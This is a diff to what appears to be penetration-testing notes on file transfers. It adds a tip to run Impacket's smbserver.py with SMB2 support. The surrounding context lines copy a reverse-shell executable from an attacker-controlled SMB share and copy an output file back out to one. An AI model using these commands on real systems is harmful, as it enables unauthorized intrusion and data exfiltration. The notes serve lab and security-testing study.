@@ -106,6 +106,18 @@ copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
 copy output.txt \\10.10.14.22\kali\output.txt
 ```
 
+#### SMB2 Support
+
+* If you recieve this error when attempting to transfer files:
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+* Restart your smbserver.py with this option at the end:
+
+```
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . -smb2support
+```
+
 ## Wget
 
 ```
